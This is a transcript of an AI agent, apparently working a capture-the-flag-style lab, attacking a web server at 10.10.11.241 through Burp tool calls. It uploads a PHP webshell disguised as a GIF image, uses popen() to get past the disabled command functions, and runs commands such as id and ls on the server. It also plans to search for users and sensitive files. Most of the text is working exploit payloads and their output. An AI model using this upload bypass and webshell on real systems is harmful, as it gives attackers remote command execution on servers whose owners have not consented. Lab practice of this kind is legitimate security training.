I found the issue! Looking at the phpinfo page, I can see that many command execution functions are disabled in PHP:

```
disable_functions: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,shell_exec,exec,proc_open,preg_replace,passthru,curl_exec
```

This explains why our command execution attempts weren't working. Let's try a webshell that uses the `popen()` function, which isn't in the disabled list:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /upload.php HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: multipart/form-data; boundary=---------------------------12345678901234567890123456789\r\nContent-Length: 628\r\nConnection: close\r\n\r\n-----------------------------12345678901234567890123456789\r\nContent-Disposition: form-data; name=\"image\"; filename=\"popen.phar\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a;\r\n<?php\r\necho \"<html><body>\";\r\necho \"<h1>Web Shell (popen)</h1>\";\r\necho \"<form method='POST'>\";\r\necho \"Command: <input type='text' name='cmd' style='width:500px;'>\";\r\necho \"<input type='submit' value='Execute'>\";\r\necho \"</form>\";\r\nif(isset($_POST['cmd'])){\r\n    echo \"<pre>\";\r\n    $handle = popen($_POST['cmd'] . ' 2>&1', 'r');\r\n    echo htmlspecialchars(stream_get_contents($handle));\r\n    pclose($handle);\r\n    echo \"</pre>\";\r\n}\r\necho \"</body></html>\";\r\n?>\r\n-----------------------------12345678901234567890123456789--",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 302 Found
Date: Thu, 08 May 2025 01:00:09 GMT
Server: Apache/2.4.55 (Ubuntu)
Location: /success.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 2:00:10 PM (America/New_York, UTC-4:00)

# Context Window Usage
83,959 / 200K tokens used (42%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! The upload was successful. Now let's try to access the new webshell and execute a command:
</thinking>

Now let's access our new webshell that uses the popen() function:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "GET /uploads/popen.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nConnection: close\r\n\r\n",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 01:00:14 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 185
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell (popen)</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 2:00:15 PM (America/New_York, UTC-4:00)

# Context Window Usage
84,410 / 200K tokens used (42%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! Now let's try to execute a command using the new webshell:
</thinking>

Now let's execute a command to test if popen() works:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/popen.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\nConnection: close\r\n\r\ncmd=id",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 01:00:19 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 250
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell (popen)</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form><pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre></body></html>
<environment_details>
# VSCode Visible Files
(No visible files)

# VSCode Open Tabs
(No open tabs)

# Current Time
5/7/2025, 2:00:21 PM (America/New_York, UTC-4:00)

# Context Window Usage
84,954 / 200K tokens used (42%)

# Current Mode
ACT MODE
</environment_details>

---

**Assistant:**

<thinking>
Great! The popen() function works and we can execute commands. We've successfully created a working webshell. Let's try a few more commands to explore the system:

1. Let's check the current directory and list files
2. Let's see what other users are on the system
3. Let's check if we can access any sensitive files
</thinking>

Success! The popen() function works and we can execute commands. Let's try a few more commands to explore the system:

<use_mcp_tool>
<server_name>burpmcp</server_name>
<tool_name>http1-send</tool_name>
<arguments>
{
  "data": "POST /uploads/popen.phar HTTP/1.1\r\nHost: 10.10.11.241:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml\r\nCookie: PHPSESSID=6qaatgee7p8mj7aeu3fc0g3jtn\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 17\r\nConnection: close\r\n\r\ncmd=pwd%3B+ls+-la",
  "host": "10.10.11.241",
  "port": 8080,
  "secure": false
}
</arguments>
</use_mcp_tool>

---

**User:**

[use_mcp_tool for 'burpmcp'] Result:
HTTP/1.1 200 OK
Date: Thu, 08 May 2025 01:00:26 GMT
Server: Apache/2.4.55 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 390
Connection: close
Content-Type: text/html; charset=UTF-8

GIF89a;
<html><body><h1>Web Shell (popen)</h1><form method='POST'>Command: <input type='text' name='cmd' style='width:500px;'><input type='submit' value='Execute'></form><pre>/var/www/html/uploads
total 12
drwxrwxr-x 2 root     www-data 4096 May  8 01:00 .
drwxr-xr-x 8 www-data www-data 4096 Oct 24  2023 ..
-rw-r--r-- 1 www-data www-data  465 May  8 01:00 popen.phar
</pre></body></html>